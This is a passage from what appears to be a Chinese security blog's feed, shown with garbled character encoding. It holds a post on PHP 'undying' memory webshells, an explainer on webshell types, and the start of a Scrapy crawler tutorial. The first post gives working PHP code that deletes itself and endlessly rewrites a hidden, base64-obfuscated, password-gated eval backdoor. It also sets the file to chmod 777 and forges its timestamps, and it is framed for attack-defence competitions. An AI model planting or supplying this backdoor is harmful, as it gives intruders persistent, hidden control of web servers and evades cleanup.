href="https://www.freebuf.com/articles/web/274466.html">ä¸€æ–‡çœ‹æ‡‚å†…å­˜é©¬</a></p></div><h1>PHPå†…å­˜é©¬</h1><p>PHPå†…å­˜é©¬ï¼Œä¹Ÿå«åšPHPä¸æ­»é©¬ã€ä¸æ­»åƒµå°¸ï¼Œåœ¨çº¿ä¸‹AWDæ¯”èµ›ä¸­æ˜¯å¸¸ç”¨æ‰‹æ®µä¹‹ä¸€ï¼Œç”¨äº<code>æƒé™ç»´æŒ</code>ã€‚<br>åœ¨èšå‰‘ä¸­ä¹Ÿæœ‰ä¸“é—¨çš„æ’ä»¶å¯ä»¥ä¸€é”®æ³¨å…¥å†…å­˜é©¬ã€‚åŸç†ä¹Ÿå¾ˆç®€å•ï¼Œç›¸å¯¹äºJavaå¯ä»¥ç›´æ¥æŠŠæ•´ä¸ªshellå†™å…¥å†…å­˜ï¼Œphpå†…å­˜é©¬çš„å®ç°åˆ™æ˜¯å°†ä¸€ä¸ªæœ¨é©¬åå¤å†™å…¥ï¼Œè¾¾åˆ°<code>æ— æ³•åˆ é™¤</code>çš„ç›®çš„ã€‚</p><p>ä¸æ­»é©¬åŸå‹å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ignore_user_abort(<span class="literal">true</span>);                   <span class="comment">//è®¾ç½®å®¢æˆ·ç«¯æ–­å¼€è¿æ¥æ—¶æ˜¯å¦ä¸­æ–­è„šæœ¬çš„æ‰§è¡Œ</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);                         <span class="comment">//è®¾ç½®è„šæœ¬æœ€å¤§æ‰§è¡Œæ—¶é—´ï¼Œlinuxä¸‹å¯èƒ½ä¸å¤§å¥½ç”¨</span></span><br><span class="line">    unlink(<span class="keyword">__FILE__</span>);                           <span class="comment">//åˆ é™¤å½“å‰æ–‡ä»¶æœ¬èº«ï¼Œä»¥èµ·åˆ°éšè”½è‡ªèº«çš„ä½œç”¨</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&#x27;shell.php&#x27;</span>;                        <span class="comment">//æ–‡ä»¶å</span></span><br><span class="line">    <span class="variable">$code</span> = <span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>;    <span class="comment">//æ¶æ„ä»£ç </span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            file_put_contents(<span class="variable">$file</span>, <span class="variable">$code</span>);     <span class="comment">//æ‰“å¼€fileæ–‡ä»¶ï¼Œç„¶åå†™å…¥code</span></span><br><span class="line">        &#125;</span><br><span class="line">        usleep(<span class="number">100</span>);                             <span class="comment">//å»¶è¿Ÿæ‰§è¡Œå¯æœ‰å¯æ— </span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šä¼ ä¹‹å,è®¿é—®è¯¥é¡µé¢ï¼Œå°±ä¼šä¸æ–­ç”Ÿæˆ<code>shell.php</code>ï¼Œæˆ‘ä»¬å°±ç›´æ¥å¯ä»¥åˆ©ç”¨<code>shell.php</code><br>ä½†æ˜¯åŸå‹æœ‰ä¸€ä¸ª<code>ç¼ºç‚¹</code>ï¼šwhileé‡Œé¢åªæ˜¯åˆ¤æ–­äº†è¿™ä¸ªæ–‡ä»¶æ˜¯å¦å­˜åœ¨, é‚£ä¹ˆåªè¦æŠŠæ–‡ä»¶ä¸­çš„shellæ³¨é‡Šæ‰å°±å¯ä»¥ç»•è¿‡ä½ çš„å†…å­˜æœ¨é©¬äº†ã€‚</p><h1>æœ¨é©¬æ”¹è¿›</h1><p>åœ¨åŸå‹çš„åŸºç¡€ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œæ”¹è¿›ä¸€ä¸‹</p><ol><li><p>åœ¨æ–‡ä»¶å‰é¢åŠ ä¸ªç‚¹<code>.</code>åœ¨Linuxç³»ç»Ÿä¸­å˜æˆ<code>éšè—æ–‡ä»¶</code>ï¼Œç”¨æ¥éšè”½è‡ªå·±</p></li><li><p>ä¸ºäº†<code>é˜²æ­¢</code>è¢«å…¶ä»–äººåˆ©ç”¨ï¼Œå¯ä»¥å¯¹<code>æ¶æ„ä»£ç </code>è¿›è¡Œä¿®æ”¹ï¼Œç”¨<code>md5</code>åŠ å¯†éªŒè¯ï¼Œæˆ–è€…å…¶ä»–åˆ©ç”¨æ–¹æ³•éªŒè¯ï¼Œåªè¦ä¸è®©å…¶ä»–äººæ­é¡ºé£è½¦éƒ½å¯ä»¥</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="variable">$_GET</span>[<span class="string">&quot;pwd&quot;</span>]) == <span class="string">&quot;9003d1df22eb4d3820015070385194c8&quot;</span>)&#123;      </span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[cmd]);</span><br><span class="line">    &#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯†ç ä¸ºpwdï¼Œåªæœ‰å‚æ•°<code>pwd</code>æ­£ç¡®æ—¶ï¼Œæ‰å¯ä½¿ç”¨<code>cmd</code>å‚æ•°</p></li><li><p>å¯¹<code>æ¶æ„ä»£ç </code>è¿›è¡Œä¸€ä¸ª<code>baseç¼–ç </code>ï¼Œç»•è¿‡ç®€å•æŸ¥æ€</p></li><li><p>ä¿®æ”¹ifè¯­å¥å†…çš„åˆ¤æ–­ï¼Œæ”¹ä¸º<code>md5åŠ å¯†çš„å†…å®¹åŒ¹é…</code></p></li><li><p>èµ‹äºˆæœ¨é©¬æ–‡ä»¶<code>æœ€é«˜</code>æƒé™<code>777</code></p></li><li><p>è®¾ç½®ä¿®æ”¹æœ¨é©¬æ–‡ä»¶çš„<code>ä¿®æ”¹æ—¶é—´</code></p></li></ol><p>æ”¹è¿›åç¤ºä¾‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&#x27;.shell.php&#x27;</span>;                                   </span><br><span class="line">    <span class="variable">$code</span> = base64_decode(<span class="string">&#x27;PD9waHAgCiAgICAgICAgaWYobWQ1KCRfR0VUWyJwd2QiXSkgPT0gIjkwMDNkMWRmMjJlYjRkMzgyMDAxNTA3MDM4NTE5NGM4Iil7ICAgICAgCiAgICAgICAgICAgIEBldmFsKCRfUkVRVUVTVFtjbWRdKTsKICAgICAgICB9IAogICAgPz4=&#x27;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(md5(file_get_contents(<span class="variable">$file</span>)) !== md5(<span class="variable">$code</span>)) &#123;</span><br><span class="line">            file_put_contents(<span class="variable">$file</span>, <span class="variable">$code</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        system(<span class="string">&#x27;chmod 777 &#x27;</span>.<span class="variable">$file</span>);</span><br><span class="line">        touch(<span class="variable">$file</span>, mktime(hour, minute, second, month, day, year));</span><br><span class="line">        usleep(<span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><div class="note warning flat"><p>ä»¥ä¸Šéƒ½æ˜¯ä¸€äº›æ€è·¯ï¼Œè‹¥è¿˜æœ‰å…¶ä»–è¡¥å……çš„è¿˜è¯·å¤§ä½¬èµæ•™ï¼Œå¯ç”¨äºAwdæ¯”èµ›ï¼Œåˆ‡å‹¿ç”¨äºä¸æ³•ä¹‹åœ°ï¼</p></div>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
          <category> webShell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webShell </tag>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebShellï¼ˆ1ï¼‰| åŸºç¡€è¯¦è§£</title>
      <link href="/posts/510672c5/"/>
      <url>/posts/510672c5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="note default flat"><p>å‰æ®µæ—¶é—´å¿™ç€é¡¹ç›®ï¼Œawdæ¯”èµ›ç­‰ï¼Œéƒ½æ²¡æ€ä¹ˆå†™åšå®¢ï¼Œä¸æ˜¯æ²¡å­¦ï¼Œæ˜¯ä¸çŸ¥é“å†™å•¥ã€‚<br>å¥½äº†ï¼Œè¯ä¸å¤šè¯´ï¼Œ2022å¹´çš„ç¬¬ä¸€ç¯‡åšå®¢ã€‚</p></div><h1>WebShellåŸºç¡€</h1><h2 id="ä»€ä¹ˆæ˜¯WebShell">ä»€ä¹ˆæ˜¯WebShell?</h2><p>é¡¾åæ€ä¹‰ï¼Œ<code>web</code>çš„å«ä¹‰æ˜¯æ˜¾ç„¶éœ€è¦æœåŠ¡å™¨å¼€æ”¾webæœåŠ¡ï¼Œ<code>shell</code>çš„å«ä¹‰æ˜¯å–å¾—å¯¹æœåŠ¡å™¨æŸç§ç¨‹åº¦ä¸Šæ“ä½œæƒé™ã€‚<br>webShellå¸¸å¸¸è¢«ç§°ä¸ºå…¥ä¾µè€…é€šè¿‡ç½‘ç«™ç«¯å£å¯¹ç½‘ç«™æœåŠ¡å™¨çš„æŸç§ç¨‹åº¦ä¸Šæ“ä½œçš„æƒé™ã€‚ç”±äºwebShellå…¶å¤§å¤šæ˜¯ä»¥åŠ¨æ€è„šæœ¬çš„å½¢å¼å‡ºç°ï¼Œä¹Ÿæœ‰äººç§°ä¹‹ä¸ºç½‘ç«™çš„åé—¨å·¥å…·ã€‚</p><p>webShellå°±æ˜¯ä»¥<code>asp</code>ã€<code>php</code>ã€<code>jsp</code>æˆ–è€…<code>cgi</code>ç­‰ç½‘é¡µæ–‡ä»¶å½¢å¼å­˜åœ¨çš„ä¸€ç§ä»£ç æ‰§è¡Œç¯å¢ƒï¼Œä¹Ÿå¯ä»¥å°†å…¶ç§°åšä¸ºä¸€ç§ç½‘é¡µåé—¨ã€‚</p><p><code>å…¥ä¾µè€…</code>åœ¨å…¥ä¾µäº†ä¸€ä¸ªç½‘ç«™åï¼Œé€šå¸¸ä¼šå°†aspæˆ–phpåé—¨æ–‡ä»¶ä¸ç½‘ç«™ç›®å½•ä¸‹æ­£å¸¸çš„ç½‘é¡µæ–‡ä»¶æ··åœ¨ä¸€èµ·ï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨æµè§ˆå™¨æ¥è®¿é—®aspæˆ–è€…phpåé—¨ï¼Œå¾—åˆ°ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œç¯å¢ƒï¼Œä»¥è¾¾åˆ°<code>æ§åˆ¶ç½‘ç«™æœåŠ¡å™¨</code>çš„ç›®çš„ã€‚</p><div class="note primary flat"><p><code>Shell</code>æ˜¯ä¸€ä¸ªäººæœºäº¤äº’é¡µé¢ï¼Œèƒ½æ“æ§æœåŠ¡å™¨å¹¶è·å–æƒé™ã€‚</p></div><p><code>Shell</code>æ–‡ä»¶æœ‰ä¸ªå˜æ€çš„åœ°æ–¹ï¼Œå°±æ˜¯å¯ä»æœåŠ¡å™¨é‚£è¾¹æ¥æ”¶æ•°æ®å¹¶æ‰§è¡Œã€è¿”å›ç»“æœï¼Œä¹Ÿå°±æ˜¯è¯´åªè¦æŠŠshellæ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼Œå°±èƒ½æ“æ§æœåŠ¡å™¨äº†ã€‚</p><div class="note warning no-icon flat"><p>åˆ©ç”¨webShellå¯ä»¥åœ¨WebæœåŠ¡å™¨ä¸Šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€çªƒå–æ•°æ®ã€æ¤å…¥ç—…æ¯’ã€å‹’ç´¢æ ¸å¿ƒæ•°æ®ã€SEOæŒ‚é©¬ç­‰æ¶æ„æ“ä½œï¼Œå±å®³æå¤§ã€‚</p></div><h2 id="WebShellçš„ç‰¹ç‚¹">WebShellçš„ç‰¹ç‚¹</h2><p><code>å…¥ä¾µè€…</code>ä½¿ç”¨webShellçš„ç¬¬ä¸€æ­¥é€šå¸¸æ˜¯å°†å…¶ä¸Šä¼ åˆ°å¯è®¿é—®çš„æœåŠ¡å™¨ä¸­ï¼Œä¾‹å¦‚åˆ©ç”¨ç”¨æˆ·CMSç³»ç»Ÿçš„ç¬¬ä¸‰æ–¹æ’ä»¶ä¸­çš„æ¼æ´ä¸Šä¼ ä¸€ä¸ªç®€å•çš„php webShellã€‚</p><p>å½“ç„¶ï¼ŒwebShellç±»å‹å’Œä½œç”¨ä¹Ÿä¸å®Œå…¨ç›¸åŒ<br>ä¸€äº›ç®€å•çš„webShellåªèµ·åˆ°è¿æ¥å¤–ç•Œçš„ä½œç”¨ï¼Œå…è®¸å…¥ä¾µè€…æ’å…¥æ›´åŠ ç²¾å‡†çš„æ¶æ„è„šæœ¬ï¼Œæ‰§è¡Œä»–ä»¬æ‰€éœ€è¦çš„æŒ‡ä»¤ï¼›<br>å¦å¤–ä¸€äº›åˆ™å¯èƒ½æ›´åŠ å¤æ‚ï¼Œå¸¦æœ‰æ•°æ®åº“æˆ–æ–‡ä»¶æµè§ˆå™¨ï¼Œè®©å…¥ä¾µè€…èƒ½å¤Ÿä»æ•°åƒè‹±é‡Œä¹‹å¤–çš„åœ°æ–¹æŸ¥çœ‹å…¥ä¾µç³»ç»Ÿçš„ä»£ç å’Œæ•°æ®ã€‚</p><div class="note danger flat"><p>æ— è®ºä½•ç§è®¾è®¡ï¼ŒwebShelléƒ½æå…¶å±é™©ï¼Œæ˜¯ç½‘ç»œç½ªçŠ¯å’Œé«˜çº§æŒç»­å¨èƒ(APTs)çš„å¸¸ç”¨å·¥å…·ã€‚</p></div><p>webShellå¸¸è§çš„æ”»å‡»ç‰¹ç‚¹ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ol><li><p>æŒä¹…åŒ–è¿œç¨‹è®¿é—®<br>webShellè„šæœ¬é€šå¸¸ä¼šåŒ…å«åé—¨ï¼Œå…¥ä¾µè€…ä¸Šä¼ webShellä¹‹åï¼Œå°±å¯ä»¥å……åˆ†åˆ©ç”¨webShellçš„<code>åé—¨</code>å®ç°<code>è¿œç¨‹è®¿é—®å¹¶æ§åˆ¶æœåŠ¡å™¨</code>ï¼Œä»è€Œè¾¾åˆ°é•¿æœŸæ§åˆ¶ç½‘ç«™æœåŠ¡å™¨çš„ç›®çš„ã€‚<br>æ­¤å¤–ï¼Œåœ¨ä¸Šä¼ å®ŒwebShellä¹‹åï¼Œå…¥ä¾µè€…ä¼šé€‰æ‹©è‡ªå·±ä¿®å¤æ¼æ´ï¼Œä»¥ç¡®ä¿æ²¡æœ‰å…¶ä»–äººä¼šåˆ©ç”¨è¯¥æ¼æ´ã€‚<br>é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå…¥ä¾µè€…å°±å¯ä»¥ä¸€ç§ä½è°ƒçš„å§¿æ€ï¼Œé¿å…ä¸ç®¡ç†å‘˜è¿›è¡Œä»»ä½•äº¤äº’ï¼ŒåŒæ—¶ä»ç„¶è·å¾—ç›¸åŒçš„ç»“æœã€‚</p></li><li><p>ææƒ<br>åœ¨æœåŠ¡å™¨æ²¡æœ‰é…ç½®é”™è¯¯çš„æƒ…å†µä¸‹ï¼ŒwebShellå°†åœ¨webæœåŠ¡å™¨çš„ç”¨æˆ·æƒé™ä¸‹è¿è¡Œï¼Œè€Œç”¨æˆ·æƒé™æ˜¯æœ‰é™çš„ã€‚<br>é€šè¿‡webShellï¼Œå…¥ä¾µè€…å¯ä»¥åˆ©ç”¨ç³»ç»Ÿä¸Šçš„æœ¬åœ°æ¼æ´æ¥å®ç°æƒé™æå‡ï¼Œä»è€Œè·å¾—Rootæƒé™ï¼Œè¿™æ ·å…¥ä¾µè€…åŸºæœ¬ä¸Šå¯ä»¥åœ¨ç³»ç»Ÿä¸Šåšä»»ä½•äº‹æƒ…ï¼ŒåŒ…æ‹¬å®‰è£…è½¯ä»¶ã€æ›´æ”¹æƒé™ã€æ·»åŠ å’Œåˆ é™¤ç”¨æˆ·ã€çªƒå–å¯†ç ã€é˜…è¯»ç”µå­é‚®ä»¶ç­‰ç­‰ã€‚</p></li><li><p>éšè”½æ€§æå¼º<br>webShellå¯ä»¥åµŒå¥—åœ¨æ­£å¸¸ç½‘é¡µä¸­è¿è¡Œï¼Œä¸”ä¸å®¹æ˜“è¢«æŸ¥æ€ã€‚å®ƒè¿˜å¯ä»¥ç©¿è¶ŠæœåŠ¡å™¨é˜²ç«å¢™ï¼Œç”±äºä¸è¢«æ§åˆ¶çš„æœåŠ¡å™¨æˆ–è¿œç¨‹ä¸»æœºäº¤äº’çš„æ•°æ®éƒ½æ˜¯é€šè¿‡80ç«¯å£ä¼ é€’ï¼Œå› æ­¤ä¸ä¼šè¢«é˜²ç«å¢™æ‹¦æˆªã€‚<br>åœ¨æ²¡æœ‰è®°å½•æµé‡çš„æƒ…å†µä¸‹ï¼ŒwebShellä½¿ç”¨poståŒ…å‘é€ï¼Œä¹Ÿä¸ä¼šè¢«è®°å½•åœ¨ç³»ç»Ÿæ—¥å¿—ä¸­ï¼Œåªä¼šåœ¨Webæ—¥å¿—ä¸­è®°å½•ä¸€äº›æ•°æ®æäº¤çš„è®°å½•ã€‚</p></li></ol><h2 id="WebShellçš„åˆ†ç±»">WebShellçš„åˆ†ç±»</h2><p>webShellæ ¹æ®è„šæœ¬å¯ä»¥åˆ†ä¸º<code>php</code>è„šæœ¬æœ¨é©¬ï¼Œ<code>asp</code>è„šæœ¬æœ¨é©¬ï¼Œ<code>jsp</code>è„šæœ¬æœ¨é©¬ï¼Œä¹Ÿæœ‰åŸºäº<code>.NET</code>çš„è„šæœ¬æœ¨é©¬ã€‚</p><p>æ ¹æ®æ—¶ä»£å’ŒæŠ€æœ¯çš„å˜è¿ï¼Œä¹Ÿæœ‰ç”¨<code>python</code>å’Œ<code>lua</code>ç¼–å†™çš„è„šæœ¬æœ¨é©¬ï¼Œå¸¸ç”¨æœ‰å¦‚ä¸‹å‡ ç§ï¼š</p><ol><li><p>å¤§é©¬</p><ul><li>ä½“ç§¯å¤§ï¼ŒåŠŸèƒ½å…¨</li><li>ä¼šè°ƒç”¨ç³»ç»Ÿå…³é”®å‡½æ•°</li><li>ä»¥ä»£ç åŠ å¯†è¿›è¡Œéšè—</li><li>ä¸€èˆ¬å…¥ä¾µè€…ä¼šè®¾ç½®å¯†ç è¿›å…¥</li></ul></li><li><p>å°é©¬</p><ul><li>ä½“ç§¯å°ï¼ŒåŠŸèƒ½å°‘</li><li>ä¸€èˆ¬åªæœ‰ä¸€ä¸ªä¸Šä¼ åŠŸèƒ½ï¼Œç”¨äºä¸Šä¼ å¤§é©¬</li></ul></li><li><p>ä¸€å¥è¯æœ¨é©¬</p><ul><li>ä»£ç çŸ­ ä½¿ç”¨åœºæ™¯å¤§ï¼Œ</li><li>å¯å•ç‹¬ç”Ÿæˆæ–‡ä»¶ï¼Œå¯æ’å…¥æ–‡ä»¶</li><li>å®‰å…¨æ€§é«˜ï¼Œéšè—æ€§å¼ºï¼Œå¯å˜å½¢å…æ€</li><li>æ¡†æ¶ä¸å˜ï¼Œæ•°æ®æ‰§è¡Œï¼Œæ•°æ®ä¼ é€’</li></ul><div class="note purple icon flat"><i class="note-icon far fa-hand-scissors"></i><p>å¯¹ä¸€å¥è¯æœ¨é©¬çš„å…·ä½“è¯¦ç»†è®²è§£å¯å‚è€ƒä¸‹é¢å¤§ä½¬çš„æ–‡ç« ï¼š<br><a href="https://www.kitsch.live/2020/12/25/%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%e2%91%a0%e4%b8%80%e5%8f%a5%e8%af%9d%e6%9c%a8%e9%a9%ac/">WebShellâ‘ ä¸€å¥è¯æœ¨é©¬</a><br><a href="https://www.uedbox.com/post/6051/">é‚£äº›å¼ºæ‚çš„PHPä¸€å¥è¯åé—¨</a><br>å†™å¾—å¾ˆå¥½ï¼Œå°±ä¸ç­é—¨å¼„æ–§äº†å˜»å˜»</p></div></li><li><p>æ‰“åŒ…é©¬</p><ul><li>ä¸»è¦ç”¨äºæ‰“åŒ…ç½‘ç«™æºç </li></ul></li><li><p>æ‹–åº“é©¬</p><ul><li>ä¸»è¦ç”¨äºå¯¼å‡ºç½‘ç«™æ•°æ®åº“</li></ul></li><li><p>å†…å­˜é©¬ï¼ˆä¹Ÿå«ä¸æ­»é©¬ï¼‰</p><ul><li>æ— æ–‡ä»¶è½åœ°</li><li>æéš¾æ£€æµ‹å’Œå‘ç°</li><li>éš¾ä»¥æ¸…é™¤</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
          <category> webShell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webShell </tag>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Scrapyçˆ¬è™«æ¡†æ¶</title>
      <link href="/posts/8386228b/"/>
      <url>/posts/8386228b/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Scrapyæ¡†æ¶æ¦‚å¿µ">Scrapyæ¡†æ¶æ¦‚å¿µ</h2><p><code>Scrapy</code>æ˜¯ä¸€ä¸ªPythonç¼–å†™çš„å¼€æºç½‘ç»œçˆ¬è™«æ¡†æ¶ã€‚å®ƒæ˜¯ä¸€ä¸ªè¢«è®¾è®¡ç”¨äºçˆ¬å–ç½‘ç»œæ•°æ®ã€æå–ç»“æ„æ€§æ•°æ®çš„æ¡†æ¶ã€‚</p><p>Scrapyæ–‡æ¡£åœ°å€ï¼š<a href="http://scrapy-chs.readthedocs.io/zh_CN/1.0/intro/overview.html">http://scrapy-chs.readthedocs.io/zh_CN/1.0/intro/overview.html</a></p><h2 id="Scrapyæ¡†æ¶ä½œç”¨">Scrapyæ¡†æ¶ä½œç”¨</h2><p>å°‘é‡çš„ä»£ç ï¼Œå°±èƒ½å¤Ÿå¿«é€Ÿçš„æŠ“å–ã€‚ä¸€èˆ¬ç”¨äºçˆ¬å–å¤§é‡æ•°æ®ã€‚</p><h2 id="Scrapyæ¡†æ¶å·¥ä½œæµç¨‹">Scrapyæ¡†æ¶å·¥ä½œæµç¨‹</h2><ol><li><p>å›é¡¾requestçš„çˆ¬è™«æµç¨‹</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210906/%E5%8E%9F%E5%A7%8B%E7%9A%84%E7%88%AC%E8%99%AB%E6%B5%81%E7%A8%8B.1a7d9jv58bmo.jpg" alt="åŸå§‹çš„çˆ¬è™«æµç¨‹"></p><p>æˆ‘ä»¬å¯ä»¥åœ¨æ­¤åŸºç¡€ä¸Šæ”¹å†™æµç¨‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210906/%E6%94%B9%E5%86%99%E7%9A%84%E7%88%AC%E8%99%AB%E6%B5%81%E7%A8%8B.ef49avaji3k.png" alt="æ”¹å†™çš„çˆ¬è™«æµç¨‹"></p><p>è€Œä¸Šé¢æ”¹å†™çš„æµç¨‹å›¾ä¹Ÿæ›´åŠ ä¾¿äºå¤§å®¶å»ç†è§£scrapyçš„æµç¨‹</p></li><li><p>Scapyçš„æµç¨‹</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210906/scapy%E7%9A%84%E6%B5%81%E7%A8%8B.2rcpyfhjjoo0.png" alt="scapyçš„æµç¨‹"></p><h3 id="å…¶æµç¨‹è¯¦ç»†å¦‚ä¸‹ï¼š">å…¶æµç¨‹è¯¦ç»†å¦‚ä¸‹ï¼š</h3><ol><li>çˆ¬è™«ä¸­èµ·å§‹çš„urlæ„é€ æˆrequestå¯¹è±¡â€”â€”&gt;çˆ¬è™«ä¸­é—´ä»¶â€”â€”&gt;å¼•æ“â€”â€”&gt;è°ƒåº¦å™¨</li><li>è°ƒåº¦å™¨æŠŠrequestâ€”â€”&gt;å¼•æ“â€”â€”&gt;ä¸‹è½½ä¸­é—´ä»¶â€”â€”&gt;ä¸‹è½½å™¨</li><li>ä¸‹è½½å™¨å‘é€è¯·æ±‚ï¼Œè·å–responseå“åº”â€”â€”&gt;ä¸‹è½½ä¸­é—´ä»¶â€”â€”&gt;å¼•æ“â€”â€”&gt;çˆ¬è™«ä¸­é—´ä»¶â€”â€”&gt;çˆ¬è™«</li><li>çˆ¬è™«æå–urlåœ°å€ï¼Œç»„è£…æˆrequestå¯¹è±¡â€”â€”&gt;çˆ¬è™«ä¸­é—´ä»¶â€”â€”&gt;å¼•æ“â€”â€”&gt;è°ƒåº¦å™¨ï¼Œé‡å¤æ­¥éª¤2</li><li>çˆ¬è™«æå–æ•°æ®â€”â€”&gt;å¼•æ“â€”â€”&gt;ç®¡é“å¤„ç†å’Œä¿å­˜æ•°æ®</li></ol></li></ol><div class="note warning no-icon flat"><p>â€‹æ³¨æ„ï¼š</p><ul><li>å›¾ä¸­ç»¿è‰²çº¿æ¡çš„è¡¨ç¤ºæ•°æ®çš„ä¼ é€’</li><li>æ³¨æ„å›¾ä¸­ä¸­é—´ä»¶çš„ä½ç½®ï¼Œå†³å®šäº†å…¶ä½œç”¨</li><li>æ³¨æ„å…¶ä¸­å¼•æ“çš„ä½ç½®ï¼Œæ‰€æœ‰çš„æ¨¡å—ä¹‹å‰ç›¸äº’ç‹¬ç«‹ï¼Œåªå’Œå¼•æ“è¿›è¡Œäº¤äº’</li></ul></div><h2 id="å„æ¨¡å—çš„å…·ä½“ä½œç”¨">å„æ¨¡å—çš„å…·ä½“ä½œç”¨</h2><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210906/%E5%90%84%E6%A8%A1%E5%9D%97%E4%BD%9C%E7%94%A8.5z8n2kdpqtw0.jpg" alt="å„æ¨¡å—ä½œç”¨"></p><p>â€‹å„æ¨¡å—åŠŸèƒ½ï¼š</p><ul><li>å¼•æ“ â€”â€” æ•°æ®å’Œä¿¡å·çš„ä¼ é€’</li><li>è°ƒåº¦å™¨ â€”â€” ä»»åŠ¡urlé˜Ÿåˆ—</li><li>ä¸‹è½½å™¨ â€”â€” å‘é€è¯·æ±‚ã€è·å–å“åº”</li><li>çˆ¬è™« â€”â€” èµ·å§‹çš„urlã€è§£ææ•°æ®</li><li>ç®¡é“ â€”â€” ä¿å­˜æ•°æ®</li><li>ä¸­é—´ä»¶ â€”â€” å®šåˆ¶åŒ–æ“ä½œ</li></ul><h2 id="ä¸‰ä¸ªå†…ç½®å¯¹è±¡">ä¸‰ä¸ªå†…ç½®å¯¹è±¡</h2><ul><li>requestè¯·æ±‚å¯¹è±¡ï¼šç”±urlã€methodã€post_dataã€headersç­‰æ„æˆ</li><li>responseå“åº”å¯¹è±¡ï¼šç”±urlã€bodyã€statusã€headersç­‰æ„æˆ</li><li>itemæ•°æ®å¯¹è±¡ï¼šæœ¬è´¨æ˜¯ä¸ªå­—å…¸</li></ul><h2 id="å®‰è£…">å®‰è£…</h2><p>æœ‰æ—¶pipç‰ˆæœ¬è¿‡äºè€æ—§ä¸èƒ½ä½¿ç”¨ï¼Œéœ€è¦å‡çº§pipç‰ˆæœ¬ï¼Œè¾“å…¥<code>pip install --upgrade pip</code>å›è½¦ï¼Œå‡çº§æˆåŠŸ</p><p>å®‰è£…scrapyå‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip/pip3 install Scrapy</span><br></pre></td></tr></table></figure><h2 id="scrapyé¡¹ç›®å¼€å‘æµç¨‹">scrapyé¡¹ç›®å¼€å‘æµç¨‹</h2><ol><li>åˆ›å»ºé¡¹ç›®</li><li>ç”Ÿæˆä¸€ä¸ªçˆ¬è™«</li><li>æå–æ•°æ®</li><li>ä¿å­˜æ•°æ®</li></ol><h2 